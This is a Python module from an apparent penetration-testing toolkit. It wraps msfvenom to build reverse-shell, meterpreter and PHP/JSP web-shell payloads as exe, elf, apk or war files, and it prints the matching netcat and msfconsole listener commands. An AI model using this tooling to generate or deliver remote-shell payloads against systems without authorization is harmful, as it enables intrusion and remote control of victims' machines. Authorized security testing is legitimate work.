"""kernox.tools.msfvenom – Payload generation for authorized testing."""

from __future__ import annotations
import subprocess
import re
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()


class MsfvenomTool:
    name = "msfvenom"
    _authorization_shown = False

    def build_command(self, **kwargs) -> str:
        """Build msfvenom command."""
        payload = kwargs.get("payload", "")
        lhost = kwargs.get("lhost", "")
        lport = kwargs.get("lport", "")
        format_type = kwargs.get("format", "")
        output = kwargs.get("output", "")

        # Show authorization warning only once per session
        if not MsfvenomTool._authorization_shown:
            console.print(Panel(
                "[dim]Remember: Only use on systems you have permission to test[/dim]",
                title="[bold yellow]Authorized Use Only[/bold yellow]",
                border_style="yellow",
                box=box.ROUNDED,
            ))
            MsfvenomTool._authorization_shown = True

        # If no payload, ask interactively
        if not payload or "please provide" in payload.lower():
            payload = self._interactive_payload_selection()

        # If no format, ask
        if not format_type:
            format_type = self._select_format(payload)

        cmd_parts = ["msfvenom", "-p", payload]

        # ALWAYS ask for LHOST if it's a reverse shell payload
        if self._needs_lhost(payload):
            console.print("\n[bold cyan]Reverse Shell Configuration[/bold cyan]")
            while True:
                lhost = Prompt.ask("[cyan]LHOST (your listener IP)[/cyan]")
                if lhost and "please" not in lhost.lower():
                    break
                console.print("[red]Please enter a valid IP address[/red]")
            cmd_parts.append(f"LHOST={lhost}")

        # ALWAYS ask for LPORT if needed
        if self._needs_lport(payload):
            while True:
                lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
                if lport and "please" not in lport.lower():
                    break
            cmd_parts.append(f"LPORT={lport}")

        # Add format
        if format_type and format_type != "raw":
            cmd_parts.extend(["-f", format_type])

        # Generate output filename if not provided
        if not output:
            clean_name = payload.replace("/", "_").replace(" ", "_")
            ext_map = {
                "exe": ".exe", "elf": ".elf", "php": ".php", "py": ".py",
                "pl": ".pl", "rb": ".rb", "jsp": ".jsp", "war": ".war",
                "ps1": ".ps1", "vbs": ".vbs", "apk": ".apk", "raw": ".bin"
            }
            ext = ext_map.get(format_type, ".bin")
            output = f"/tmp/msfvenom_{clean_name}{ext}"

        cmd_parts.extend(["-o", output])

        # Show summary
        console.print("\n[bold cyan]Payload Details:[/bold cyan]")
        console.print(f"  * Payload: [yellow]{payload}[/yellow]")
        if lhost and "please" not in lhost.lower():
            console.print(f"  * Listener: [yellow]{lhost}:{lport}[/yellow]")
        console.print(f"  * Format: [yellow]{format_type}[/yellow]")
        console.print(f"  * Output: [yellow]{output}[/yellow]")
        console.print()

        # Show listener command
        if lhost and "please" not in lhost.lower() and lport and "please" not in lport.lower():
            console.print("[bold green]Start listener:[/bold green]")
            console.print(f"  [cyan]nc -lvnp {lport}[/cyan]")
            if "meterpreter" in payload.lower():
                console.print(f"  [cyan]msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'[/cyan]")
            console.print()

        return " ".join(cmd_parts)

    def _needs_lhost(self, payload: str) -> bool:
        """Check if payload requires LHOST."""
        reverse_keywords = ["reverse", "meterpreter", "shell_reverse"]
        return any(kw in payload.lower() for kw in reverse_keywords)

    def _needs_lport(self, payload: str) -> bool:
        """Check if payload requires LPORT."""
        port_keywords = ["reverse", "bind", "meterpreter", "shell_reverse", "shell_bind"]
        return any(kw in payload.lower() for kw in port_keywords)

    def _select_format(self, payload: str) -> str:
        """Ask user which format to save the payload."""
        console.print("\n[bold cyan]Output format:[/bold cyan]")

        # Suggest format based on payload
        suggested_formats = []
        if "windows" in payload.lower():
            suggested_formats = ["exe", "ps1", "vbs", "raw"]
        elif "linux" in payload.lower():
            suggested_formats = ["elf", "python", "perl", "raw"]
        elif "php" in payload.lower():
            suggested_formats = ["php", "raw"]
        elif "java" in payload.lower() or "jsp" in payload.lower():
            suggested_formats = ["jsp", "war", "raw"]
        elif "android" in payload.lower():
            suggested_formats = ["apk", "raw"]
        else:
            suggested_formats = ["raw", "exe", "elf", "php", "py", "pl", "rb", "jsp", "war"]

        # Display formats
        format_table = Table(show_header=False, box=box.SIMPLE)
        format_table.add_column("#", style="bold cyan", width=4)
        format_table.add_column("Format", style="bold green", width=12)
        format_table.add_column("Description", style="dim")

        formats_desc = {
            "exe": "Windows executable",
            "elf": "Linux executable",
            "php": "PHP script",
            "py": "Python script",
            "pl": "Perl script",
            "rb": "Ruby script",
            "jsp": "Java Server Pages",
            "war": "Web archive",
            "ps1": "PowerShell script",
            "vbs": "VBScript",
            "apk": "Android package",
            "raw": "Raw binary",
        }

        for i, fmt in enumerate(suggested_formats[:10], 1):
            desc = formats_desc.get(fmt, "Generic")
            format_table.add_row(str(i), fmt, desc)

        console.print(format_table)
        console.print(f"  {len(suggested_formats)+1}. [cyan]Custom[/cyan]\n")

        choice = Prompt.ask("Select", default="1")

        if int(choice) == len(suggested_formats) + 1:
            return Prompt.ask("[cyan]Enter custom format[/cyan]")
        else:
            return suggested_formats[int(choice)-1]

    def _interactive_payload_selection(self) -> str:
        """Interactive menu for payload selection."""
        console.print("\n[bold cyan]Payload type:[/bold cyan]")
        console.print("  1. [green]Windows[/green] (reverse shells)")
        console.print("  2. [green]Linux[/green] (reverse shells)")
        console.print("  3. [green]PHP[/green] (web shells)")
        console.print("  4. [green]Java[/green] (JSP shells)")
        console.print("  5. [green]Custom[/green]\n")

        choice = Prompt.ask("Select", choices=["1","2","3","4","5"], default="1")

        payloads = {
            "1": [
                "windows/x64/meterpreter/reverse_tcp",
                "windows/shell_reverse_tcp",
                "windows/x64/shell_reverse_tcp",
            ],
            "2": [
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x86/shell_reverse_tcp",
                "linux/x64/shell_reverse_tcp",
            ],
            "3": [
                "php/meterpreter_reverse_tcp",
                "php/reverse_php",
            ],
            "4": [
                "java/jsp_shell_reverse_tcp",
                "java/shell_reverse_tcp",
            ],
        }

        if choice == "5":
            return Prompt.ask("[cyan]Enter payload[/cyan]")
        else:
            console.print("\n[bold cyan]Select:[/bold cyan]")
            for i, p in enumerate(payloads[choice], 1):
                console.print(f"  {i}. {p}")
            console.print(f"  {len(payloads[choice])+1}. Custom\n")
            p_choice = Prompt.ask("Select", default="1")
            if int(p_choice) == len(payloads[choice]) + 1:
                return Prompt.ask("[cyan]Enter payload[/cyan]")
            else:
                return payloads[choice][int(p_choice)-1]

    def parse(self, output: str) -> dict:
        """Parse msfvenom output."""
        output_file = ""
        success = False

        # Look for success message
        if "Saved as:" in output or "written to" in output:
            success = True

            # Extract output file path
            patterns = [
                r"Saved as: (.+)",
                r"written to (.+)",
                r"Payload size: .+ bytes\s+(.+)",
            ]
            for pattern in patterns:
                match = re.search(pattern, output)
                if match:
                    output_file = match.group(1).strip()
                    break

        # Extract payload size if available
        size_match = re.search(r"Payload size: (\d+) bytes", output)
        payload_size = int(size_match.group(1)) if size_match else 0

        return {
            "payload": "generated",
            "success": success,
            "output_file": output_file,
            "size": payload_size,
            "raw": output,
        }
